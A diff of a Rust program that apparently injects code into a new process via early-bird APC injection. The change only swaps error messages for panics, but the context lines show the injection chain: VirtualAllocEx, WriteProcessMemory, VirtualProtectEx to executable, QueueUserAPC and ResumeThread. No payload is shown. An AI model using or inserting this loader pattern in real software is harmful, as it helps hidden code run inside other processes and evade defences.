@@ -39,8 +39,7 @@ fn main() {
             &mut pi,
         );
         if res == FALSE {
-            eprintln!("CreateProcessA failed!");
-            return;
+            panic!("CreateProcessA failed!");
         }
 
         let dest = VirtualAllocEx(
@@ -51,8 +50,7 @@ fn main() {
             PAGE_READWRITE,
         );
         if dest.is_null() {
-            eprintln!("VirtualAllocEx failed!");
-            return;
+            panic!("VirtualAllocEx failed!");
         }
 
         let res = WriteProcessMemory(
@@ -63,21 +61,18 @@ fn main() {
             null_mut(),
         );
         if res == FALSE {
-            eprintln!("WriteProcessMemory failed!");
-            return;
+            panic!("WriteProcessMemory failed!");
         }
 
         let res = VirtualProtectEx(pi.hProcess, dest, SIZE, PAGE_EXECUTE, &mut old);
         if res == FALSE {
-            eprintln!("VirtualProtectEx failed!");
-            return;
+            panic!("VirtualProtectEx failed!");
         }
 
         let dest = transmute(dest);
         let res = QueueUserAPC(Some(dest), pi.hThread, 0);
         if res == 0 {
-            eprintln!("QueueUserAPC failed!");
-            return;
+            panic!("QueueUserAPC failed!");
         }
         ResumeThread(pi.hThread);
 
